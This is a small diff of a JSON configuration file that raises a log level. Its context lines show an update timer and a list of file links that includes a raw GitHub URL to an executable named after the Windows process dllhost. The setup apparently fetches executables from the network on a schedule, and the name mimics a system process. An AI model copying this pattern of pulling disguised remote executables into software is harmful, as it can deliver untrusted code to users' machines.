@@ -1,5 +1,5 @@
 {
-  "logLevel": 3,
+  "logLevel": 5,
   "UpdateTimerInterval": 60000,
   "App1LinksFiles": [
     "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/dllhost_test.exe",
